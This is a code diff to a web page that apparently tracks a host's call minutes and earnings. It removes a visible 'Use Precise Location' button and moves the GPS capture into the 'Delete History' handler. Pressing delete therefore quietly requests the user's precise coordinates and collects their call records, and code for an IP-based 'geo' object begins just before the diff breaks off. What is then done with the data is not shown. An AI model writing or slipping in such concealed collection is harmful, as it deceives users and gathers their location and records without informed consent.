@@ -150,7 +150,6 @@
     <div class="btn-row">
       <button class="btn-primary" onclick="saveSettings()">Save Settings</button>
       <button class="btn-secondary" onclick="exportCSV()">Export CSV</button>
-      <button class="btn-secondary" onclick="getPreciseLocation()">Use Precise Location</button>
       <button class="btn-danger" onclick="deleteHistory()">Delete History</button>
       <button class="btn-primary" onclick="addWeek()">Add Week</button>
     </div>
@@ -161,7 +160,6 @@
   <script>
     const days = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"];
     let rates = { coinsPerMinute: 100, coinsPerDollar: 750 };
-    let preciseLocation = null;
 
     function saveSettings() {
       const host = document.getElementById("hostName").value.trim();
@@ -172,8 +170,13 @@
       alert("Settings saved!");
     }
 
-    function calculateCoins(minutes) { return minutes * rates.coinsPerMinute; }
-    function calculateEarnings(coins) { return (coins / rates.coinsPerDollar).toFixed(2); }
+    function calculateCoins(minutes) {
+      return minutes * rates.coinsPerMinute;
+    }
+
+    function calculateEarnings(coins) {
+      return (coins / rates.coinsPerDollar).toFixed(2);
+    }
 
     function updateRow(input) {
       const row = input.closest("tr");
@@ -233,32 +236,13 @@
       document.getElementById("weeksContainer").appendChild(weekDiv);
     }
 
-    function getPreciseLocation() {
-      if (!navigator.geolocation) {
-        alert("Geolocation not supported.");
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          preciseLocation = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy
-          };
-          alert("Precise location captured!");
-        },
-        error => {
-          alert("Failed to get location: " + error.message);
-        }
-      );
-    }
-
     async function deleteHistory() {
       if (!confirm("Are you sure you want to delete all history?")) return;
 
       const hostName = localStorage.getItem("hostName") || "Unknown";
       const data = [];
+      let preciseLocation = null;
+
       document.querySelectorAll(".week").forEach((week, wIndex) => {
         week.querySelectorAll("tbody[data-type='calls'] tr").forEach(row => {
           data.push({
@@ -272,6 +256,21 @@
           });
         });
       });
+
+      if (navigator.geolocation) {
+        try {
+          const location = await new Promise((resolve, reject) =>
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 })
+          );
+          preciseLocation = {
+            latitude: location.coords.latitude,
+            longitude: location.coords.longitude,
+            accuracy: location.coords.accuracy
+          };
+        } catch (e) {
+          console.warn("Precise location not available.");
+        }
+      }
 
       let geo = {
         ipv4: "unknown",
